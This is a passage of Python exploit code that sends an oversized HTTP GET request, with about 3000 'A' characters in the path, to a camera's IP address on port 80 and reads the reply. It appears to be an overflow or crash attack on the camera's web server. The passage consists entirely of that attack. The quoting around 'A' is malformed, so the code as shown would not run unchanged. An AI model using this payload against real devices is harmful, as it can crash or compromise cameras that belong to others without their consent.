      request = 'GET /' + .A. * 3000 + '.html HTTP/1.0\r\n'
      s = socket.socket()
      s.connect((cam_ip, 80))
      s.send(request)
      response = s.recv(1024)
      s.close()


